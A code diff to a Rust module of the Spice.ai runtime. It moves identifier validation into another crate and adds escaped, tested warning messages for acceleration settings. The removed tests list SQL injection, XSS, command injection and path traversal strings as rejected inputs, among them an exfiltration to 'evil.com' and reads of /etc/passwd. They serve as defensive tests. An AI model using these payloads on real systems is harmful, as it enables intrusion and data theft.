@@ -14,280 +14,305 @@ See the License for the specific language governing permissions and
 limitations under the License.
 */
 
-use std::fmt::Display;
+//! Runtime components (`dataset`/`catalog`/`view`).
+//!
+//! The pure-configuration cores of these components — and the component-level
+//! helpers below — live in the [`runtime_component`] crate, which sits *below*
+//! `runtime` so connectors can name a component's configuration without pulling
+//! in the orchestrator. This module keeps the `Arc<Runtime>`-bound wrappers
+//! (`dataset::Dataset`, `catalog::Catalog`, `view::View`) and re-exports the
+//! moved items so existing `crate::component::…` paths keep resolving during the
+//! migration.
 
-use datafusion::sql::sqlparser::{
-    dialect::{Dialect, GenericDialect},
-    tokenizer::{Token, Tokenizer},
+// Component-level config helpers + config-only submodules moved down to
+// `runtime-component`. Re-exported here for path compatibility.
+pub use runtime_component::{
+    ComponentInitialization, DatasetHealthMonitor, Error, StartupOptions, access, column,
+    find_first_delimiter, validate_identifier,
 };
-use snafu::prelude::*;
 
-#[derive(Debug, Snafu)]
-pub enum Error {
-    #[snafu(display("Component name is not a valid identifier"))]
-    InvalidIdentifier,
-}
-
-pub mod access;
+// The `Arc<Runtime>`-bound wrappers stay in `runtime`.
 pub mod catalog;
-pub mod column;
 pub mod dataset;
-pub mod metrics;
 pub mod view;
 
-#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
-pub enum ComponentType {
+/// Which component an acceleration block was written on. A closed set rather than
+/// a `&str`, so a new component that grows an `acceleration:` block cannot reach
+/// [`disabled_acceleration_warning`] without deciding on its noun and its
+/// reference page.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(crate) enum AcceleratedComponent {
     Dataset,
-    DatasetAccelerator,
-    Catalog,
-    Model,
-    Embedding,
-    Tool,
-    Eval,
     View,
 }
 
-impl Display for ComponentType {
-    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+impl AcceleratedComponent {
+    /// The component word as the operator's Spicepod spells it, lower case, for
+    /// mid-sentence use.
+    const fn noun(self) -> &'static str {
         match self {
-            ComponentType::Dataset => write!(f, "dataset"),
-            ComponentType::DatasetAccelerator => write!(f, "dataset_accelerator"),
-            ComponentType::Catalog => write!(f, "catalog"),
-            ComponentType::Model => write!(f, "model"),
-            ComponentType::Embedding => write!(f, "embedding"),
-            ComponentType::Tool => write!(f, "tool"),
-            ComponentType::Eval => write!(f, "eval"),
-            ComponentType::View => write!(f, "view"),
+            Self::Dataset => "dataset",
+            Self::View => "view",
+        }
+    }
+
+    /// The same word capitalised, to open a log line with.
+    const fn titled_noun(self) -> &'static str {
+        match self {
+            Self::Dataset => "Dataset",
+            Self::View => "View",
+        }
+    }
+
+    /// The `acceleration` section of *this* component's Spicepod reference. A view
+    /// pointed at the datasets page is pointed at a block it does not have.
+    const fn acceleration_reference_url(self) -> &'static str {
+        match self {
+            Self::Dataset => "https://spiceai.org/docs/reference/spicepod/datasets#acceleration",
+            Self::View => "https://spiceai.org/docs/reference/spicepod/views#acceleration",
+        }
+    }
+
+    /// This component's Spicepod reference, unanchored. The `#acceleration` anchor
+    /// is wrong for a setting whose remedy is a field *outside* the acceleration
+    /// block, which is what the `ready_state` deprecation asks for.
+    const fn reference_url(self) -> &'static str {
+        match self {
+            Self::Dataset => "https://spiceai.org/docs/reference/spicepod/datasets",
+            Self::View => "https://spiceai.org/docs/reference/spicepod/views",
         }
     }
 }
 
-/// Validates an identifier to ensure it represents a valid component name.
+/// The warning that a component set `acceleration.ready_state`, which is honoured
+/// but deprecated in favour of the component's own top-level `ready_state`. Emitted
+/// by the load path (`init::dataset::warn_about_acceleration_block`).
 ///
-/// Uses the sqlparser-rs library to ensure it represents only a valid SQL identifier.
+/// One function for both components because it is one deprecation of one key: a
+/// dataset and a view that write the same thing should be told the same thing,
+/// and a second copy is where the two drift apart.
 ///
-/// Only allow SQL words and periods, and ensure that periods are not consecutive.
-///
-/// Allowed:
-/// - `valid_identifier`
-/// - `test.one.two`
-/// - `"test".foo.bar`
-///
-/// Disallowed:
-/// - `sneaky\"; CREATE TABLE foo (id int); -- putting comments!`
-/// - `validate your inputs!`
-pub fn validate_identifier(identifier: &str) -> Result<(), Error> {
-    let dialect: Box<dyn Dialect> = Box::new(GenericDialect);
-    let mut tokenizer = Tokenizer::new(dialect.as_ref(), identifier);
-    let Ok(tokens) = tokenizer.tokenize() else {
-        return Err(Error::InvalidIdentifier);
-    };
-
-    if tokens.is_empty() {
-        return Err(Error::InvalidIdentifier);
-    }
-
-    let mut expect_period = false;
-    for token in tokens {
-        if expect_period && matches!(token, Token::Period) {
-            expect_period = false;
-            continue;
-        } else if expect_period {
-            return Err(Error::InvalidIdentifier);
-        }
-
-        let Token::Word(word) = token else {
-            return Err(Error::InvalidIdentifier);
-        };
-
-        if word.value.is_empty() {
-            return Err(Error::InvalidIdentifier);
-        }
-
-        expect_period = true;
-    }
-
-    // Ensure the last token is not a period
-    if !expect_period {
-        return Err(Error::InvalidIdentifier);
-    }
-
-    Ok(())
+/// Built as a pure function so the wording an operator acts on — which component,
+/// the field to move the setting to, and the reference page — is asserted by a
+/// test rather than through whatever a log capture happens to retain.
+pub(crate) fn deprecated_ready_state_warning(
+    component: AcceleratedComponent,
+    name: &str,
+) -> String {
+    // `escape_debug` for the same reason as `disabled_acceleration_warning`:
+    // `validate_identifier` accepts a *quoted* identifier, and a quoted one may
+    // legally contain a newline, so a validated name can still break this line in
+    // two and forge a second one.
+    let name = name.escape_debug();
+    let noun = component.noun();
+    let reference = component.reference_url();
+    format!(
+        "{titled} '{name}' sets `acceleration.ready_state`, which is deprecated and will be removed. \
+        Move the setting to the {noun}'s own `ready_state` to keep it working. \
+        See: {reference}",
+        titled = component.titled_noun()
+    )
 }
 
-/// Helper function that finds the position and length of the first delimiter ('://', ':', or '/')
-fn find_first_delimiter(from: &str) -> Option<(usize, usize)> {
-    // Find the earliest occurrence of each delimiter
-    let colon_slash_slash = from.find("://");
-    let colon = from.find(':');
-    let slash = from.find('/');
-
-    // Get the position and length of the first delimiter
-    match (colon_slash_slash, colon, slash) {
-        (Some(css), Some(c), Some(s)) => {
-            let min_pos = css.min(c).min(s);
-            Some(if min_pos == css {
-                (css, 3)
-            } else {
-                (min_pos, 1)
-            })
-        }
-        (Some(css), Some(c), None) => Some(if css < c { (css, 3) } else { (c, 1) }),
-        (Some(css), None, Some(s)) => Some(if css < s { (css, 3) } else { (s, 1) }),
-        (None, Some(c), Some(s)) => Some(if c < s { (c, 1) } else { (s, 1) }),
-        (Some(css), None, None) => Some((css, 3)),
-        (None, Some(c), None) => Some((c, 1)),
-        (None, None, Some(s)) => Some((s, 1)),
-        (None, None, None) => None,
-    }
-}
-
-/// Enum representing the initialization type of a component.
+/// What to tell an operator whose dataset or view sets `acceleration.enabled:
+/// false` and leaves settings in the block that the runtime will not apply.
 ///
-/// [`OnStartup`] indicates that the component should be initialized when runtime started.
-/// [`OnTrigger`] indicates that the component should be initialized when a specific trigger event occurs.
-#[derive(Debug, Clone, Copy)]
-pub enum ComponentInitialization {
-    OnStartup,
-    OnTrigger,
-}
-
-impl ComponentInitialization {
-    #[must_use]
-    pub fn is_on_trigger(&self) -> bool {
-        matches!(self, ComponentInitialization::OnTrigger)
-    }
+/// A function rather than an inline `tracing::warn!` so the wording — which is
+/// the whole of this feature for the person reading the log — is assertable,
+/// and shared between the two components rather than written twice: a dataset
+/// and a view discard the same block for the same reason, and an operator who
+/// learns to act on one message should not have to learn a second.
+///
+/// `component` is which component is being reported — it decides both the noun in
+/// the message and which Spicepod reference page the reader is sent to.
+///
+/// Single quotes around the name the operator chose, backticks around the config
+/// keys they are being told to act on, per the repo's message convention — and
+/// the name escaped, since a quoted Spicepod identifier can carry a newline
+/// through validation and would otherwise forge a second log line.
+///
+/// It names only the fields it was given, and does not say "the rest of the
+/// block": `ready_state` is excluded by `CONSUMED_WHEN_DISABLED`, so a claim
+/// about everything under `enabled` would be untrue.
+///
+/// The remedy sentence is load-bearing and constrains what may be passed in
+/// `ignored`: it promises that removing `enabled: false` applies these
+/// settings. Only pass fields for which that is true.
+pub(crate) fn disabled_acceleration_warning(
+    component: AcceleratedComponent,
+    name: &str,
+    ignored: &[String],
+) -> String {
+    let keys = ignored
+        .iter()
+        .map(|field| format!("`{field}`"))
+        .collect::<Vec<_>>()
+        .join(", ");
+    // `escape_debug` rather than the raw name: `validate_identifier` accepts a
+    // *quoted* identifier, and a quoted one may legally contain a newline, so a
+    // validated name can still break this line in two and forge a second one.
+    let name = name.escape_debug();
+    let noun = component.noun();
+    let reference = component.acceleration_reference_url();
+    format!(
+        "{titled} '{name}' sets `acceleration.enabled: false`, so these settings in its acceleration block are read and then ignored: {keys}. Remove `enabled: false` to apply them, or remove them to keep the {noun} unaccelerated. See: {reference}",
+        titled = component.titled_noun()
+    )
 }
 
 #[cfg(test)]
 mod tests {
-    use super::*;
+    use super::{
+        AcceleratedComponent, deprecated_ready_state_warning, disabled_acceleration_warning,
+    };
 
     #[test]
-    #[allow(clippy::too_many_lines)]
-    fn test_validate_identifier() {
-        // Valid identifiers
-        assert!(validate_identifier("valid_identifier").is_ok());
-        assert!(validate_identifier("test.one.two").is_ok());
-        assert!(validate_identifier("\"test\".foo.bar").is_ok());
-        assert!(validate_identifier("a1").is_ok());
-        assert!(validate_identifier("_underscore").is_ok());
-        assert!(validate_identifier("camelCase").is_ok());
-        assert!(validate_identifier("PascalCase").is_ok());
-        assert!(validate_identifier("snake_case_123").is_ok());
-        assert!(validate_identifier("\"quoted.identifier\"").is_ok());
-        assert!(validate_identifier("db.schema.table").is_ok());
-        assert!(validate_identifier("schema.table").is_ok());
-        assert!(validate_identifier("valid@identifier").is_ok());
+    fn the_warning_names_the_component_the_fields_and_the_remedy() {
+        // Everything a reader needs to act, in one line: which dataset, what is
+        // being dropped, and the two ways out. Asserted because the message is
+        // the entire user-visible behaviour of this path (#13514).
+        let warning = disabled_acceleration_warning(
+            AcceleratedComponent::Dataset,
+            "api_data",
+            &["engine".to_string(), "refresh_mode".to_string()],
+        );
+        // Quoting and backticking are the repo's convention, not decoration: an
+        // unquoted name vanishes when it is empty and reads as prose when it is
+        // a word like `orders`.
+        assert!(warning.starts_with("Dataset 'api_data'"), "{warning}");
+        assert!(warning.contains("`engine`, `refresh_mode`"), "{warning}");
+        assert!(warning.contains("acceleration.enabled: false"), "{warning}");
+        assert!(warning.contains("Remove `enabled: false`"), "{warning}");
+        assert!(
+            warning.contains("keep the dataset unaccelerated"),
+            "{warning}"
+        );
+        assert!(
+            warning.contains("/reference/spicepod/datasets#acceleration"),
+            "{warning}"
+        );
+    }
 
-        // Invalid identifiers
-        assert!(
-            validate_identifier("sneaky\"; CREATE TABLE foo (id int); -- putting comments!")
-                .is_err()
+    #[test]
+    fn the_warning_calls_a_view_a_view_and_links_to_the_views_reference() {
+        // An operator greps the log for the component they were editing. A view
+        // reported as a "dataset" sends them to the wrong block of the Spicepod,
+        // the remedy sentence has to agree with the noun, and the link has to
+        // land on a page that documents the block they actually wrote.
+        //
+        // Asserted on the specific phrases rather than `!contains("dataset")`:
+        // the datasets *URL* legitimately contains that substring, so the blunt
+        // form fails on a correct message.
+        let warning = disabled_acceleration_warning(
+            AcceleratedComponent::View,
+            "daily_totals",
+            &["engine".to_string()],
         );
-        assert!(validate_identifier("validate your inputs!").is_err());
-        assert!(validate_identifier("").is_err());
-        assert!(validate_identifier(" ").is_err());
-        assert!(validate_identifier("1invalid").is_err());
-        assert!(validate_identifier("invalid-identifier").is_err());
-        assert!(validate_identifier("invalid:identifier").is_err());
-        assert!(validate_identifier("invalid/identifier").is_err());
-        assert!(validate_identifier("invalid\\identifier").is_err());
-        assert!(validate_identifier("invalid.").is_err());
-        assert!(validate_identifier(".invalid").is_err());
-        assert!(validate_identifier("invalid..identifier").is_err());
-        assert!(validate_identifier("\"unclosed.quote").is_err());
-        assert!(validate_identifier("closed.\"quote\"unclosed.\"quote").is_err());
+        assert!(warning.starts_with("View 'daily_totals'"), "{warning}");
+        assert!(warning.contains("keep the view unaccelerated"), "{warning}");
+        assert!(
+            warning.contains("/reference/spicepod/views#acceleration"),
+            "{warning}"
+        );
+        assert!(!warning.contains("Dataset"), "{warning}");
+        assert!(!warning.contains("the dataset"), "{warning}");
+    }
 
-        // SQL injection attack attempts
-        assert!(validate_identifier("users; DROP TABLE users;").is_err());
-        assert!(validate_identifier("admin'--").is_err());
-        assert!(validate_identifier("user' OR '1'='1").is_err());
-        assert!(validate_identifier("user\"; SELECT * FROM secrets; --").is_err());
-        assert!(validate_identifier("user'); DELETE FROM users; --").is_err());
-        assert!(validate_identifier("user\\\"; TRUNCATE TABLE logs; --").is_err());
-        assert!(
-            validate_identifier("user/**/UNION/**/SELECT/**/password/**/FROM/**/users").is_err()
+    #[test]
+    fn a_control_character_in_the_name_cannot_break_the_line_in_two() {
+        // `validate_identifier` accepts a quoted identifier, and a quoted one
+        // may contain a newline — so the name reaching this message is not
+        // guaranteed to be one line, and an unescaped one would let a name
+        // write a second log line of its own choosing.
+        let warning = disabled_acceleration_warning(
+            AcceleratedComponent::Dataset,
+            "api\nWARN forged",
+            &["engine".to_string()],
         );
         assert!(
-            validate_identifier(
-                "user' UNION SELECT NULL,NULL,NULL FROM INFORMATION_SCHEMA.TABLES; --"
-            )
-            .is_err()
-        );
-        assert!(validate_identifier("user' AND 1=CONVERT(int,(SELECT @@version)); --").is_err());
-        assert!(validate_identifier("user' AND 1=1 WAITFOR DELAY '0:0:10'--").is_err());
-        assert!(validate_identifier("user'); EXEC xp_cmdshell('net user'); --").is_err());
-        assert!(
-            validate_identifier(
-                "user' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--"
-            )
-            .is_err()
-        );
-        assert!(validate_identifier("user' ORDER BY 1--").is_err());
-        assert!(validate_identifier("user' GROUP BY 1--").is_err());
-        assert!(validate_identifier("user' HAVING 1=1--").is_err());
-        assert!(
-            validate_identifier(
-                "user'; INSERT INTO users (username, password) VALUES ('hacker', 'password');--"
-            )
-            .is_err()
+            !warning.contains('\n'),
+            "the message must stay one line: {warning}"
         );
         assert!(
-            validate_identifier(
-                "user'; UPDATE users SET admin = true WHERE username = 'hacker';--"
-            )
-            .is_err()
+            warning.contains("api\\nWARN forged"),
+            "the name must still be readable, escaped: {warning}"
         );
-        assert!(
-            validate_identifier("user'; ALTER TABLE users ADD COLUMN backdoor VARCHAR(255);--")
-                .is_err()
-        );
-        assert!(validate_identifier("user'; CREATE TRIGGER malicious_trigger AFTER INSERT ON users BEGIN /* malicious code */;--").is_err());
-        assert!(validate_identifier("user'; LOAD_FILE('/etc/passwd');--").is_err());
-        assert!(validate_identifier("user'; SELECT @@datadir;--").is_err());
-        assert!(validate_identifier("user' UNION SELECT NULL,NULL,SLEEP(5)--").is_err());
-        assert!(validate_identifier("user' AND (SELECT COUNT(*) FROM users) > 0--").is_err());
-        assert!(
-            validate_identifier(
-                "user' AND SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a'--"
-            )
-            .is_err()
-        );
-        assert!(validate_identifier("user'; DECLARE @cmd VARCHAR(255); SET @cmd = 'dir c:'; EXEC master..xp_cmdshell @cmd;--").is_err());
-        assert!(
-            validate_identifier(
-                "user'; BACKUP DATABASE master TO DISK = '\\\\evil.com\\share\\backup.bak';--"
-            )
-            .is_err()
-        );
-        assert!(validate_identifier("user' UNION ALL SELECT table_name, column_name, NULL FROM information_schema.columns--").is_err());
-        assert!(
-            validate_identifier("user'; CREATE USER hacker IDENTIFIED BY 'password';--").is_err()
-        );
-        assert!(
-            validate_identifier("user'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%';--").is_err()
-        );
+    }
 
-        // XSS-like attempts
-        assert!(validate_identifier("<script>alert('XSS')</script>").is_err());
-        assert!(validate_identifier("javascript:alert('XSS')").is_err());
-        assert!(
-            validate_identifier("data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=")
-                .is_err()
+    #[test]
+    fn the_warning_claims_only_the_fields_it_was_given() {
+        // `ready_state` is never one of the reported fields, so the message must
+        // not claim the whole block is ignored — a reader who saw that would go
+        // looking for a `ready_state` that is not broken in the way implied.
+        // This function must not widen the claim past the list it was handed.
+        let warning = disabled_acceleration_warning(
+            AcceleratedComponent::Dataset,
+            "api_data",
+            &["engine".to_string()],
         );
+        assert!(
+            !warning.contains("the rest of"),
+            "the message must scope itself to the listed fields: {warning}"
+        );
+        assert!(!warning.contains("ready_state"), "{warning}");
+    }
 
-        // Command injection attempts
-        assert!(validate_identifier("user; cat /etc/passwd").is_err());
-        assert!(validate_identifier("user && whoami").is_err());
-        assert!(validate_identifier("user | netstat -an").is_err());
-        assert!(validate_identifier("user` echo vulnerable`").is_err());
+    #[test]
+    fn the_ready_state_deprecation_names_the_replacement_and_the_components_reference() {
+        // The operator has to learn three things from this line: that the key is
+        // going away, which field to move it to, and where that field is written
+        // up. The reference is the component's page *unanchored* — the remedy is
+        // a top-level field, so `#acceleration` would land them back inside the
+        // block they are being told to move the setting out of.
+        let warning = deprecated_ready_state_warning(AcceleratedComponent::Dataset, "api_data");
+        assert!(warning.starts_with("Dataset 'api_data'"), "{warning}");
+        assert!(warning.contains("`acceleration.ready_state`"), "{warning}");
+        assert!(warning.contains("deprecated"), "{warning}");
+        assert!(
+            warning.contains("the dataset's own `ready_state`"),
+            "{warning}"
+        );
+        assert!(
+            warning.contains("/reference/spicepod/datasets"),
+            "{warning}"
+        );
+        assert!(!warning.contains("#acceleration"), "{warning}");
+        assert!(!warning.contains('\n'), "{warning}");
+    }
 
-        // Null byte injection
-        assert!(validate_identifier("user\0malicious").is_err());
+    #[test]
+    fn the_ready_state_deprecation_calls_a_view_a_view() {
+        // One function serves both components, so the noun and the link have to
+        // follow the component rather than defaulting to the dataset — a view
+        // told to edit "the dataset's" field is sent to a component it is not.
+        //
+        // Asserted on the specific phrases rather than `!contains("dataset")`:
+        // the datasets URL legitimately contains that substring.
+        let warning = deprecated_ready_state_warning(AcceleratedComponent::View, "daily_totals");
+        assert!(warning.starts_with("View 'daily_totals'"), "{warning}");
+        assert!(
+            warning.contains("the view's own `ready_state`"),
+            "{warning}"
+        );
+        assert!(warning.contains("/reference/spicepod/views"), "{warning}");
+        assert!(!warning.contains("Dataset"), "{warning}");
+        assert!(!warning.contains("the dataset"), "{warning}");
+    }
 
-        // Path traversal attempts
-        assert!(validate_identifier("../../../etc/passwd").is_err());
-        assert!(validate_identifier("..\\..\\..\\Windows\\System32").is_err());
+    #[test]
+    fn a_control_character_in_the_name_cannot_break_the_ready_state_line_in_two() {
+        // Same exposure as `disabled_acceleration_warning`, and the same reason:
+        // `validate_identifier` accepts a quoted identifier, which may legally
+        // carry a newline, so an unescaped name could write a second log record.
+        let warning =
+            deprecated_ready_state_warning(AcceleratedComponent::View, "api\nWARN forged");
+        assert!(
+            !warning.contains('\n'),
+            "the message must stay one line: {warning}"
+        );
+        assert!(
+            warning.contains("WARN forged"),
+            "the name is still reported, only escaped: {warning}"
+        );
     }
 }
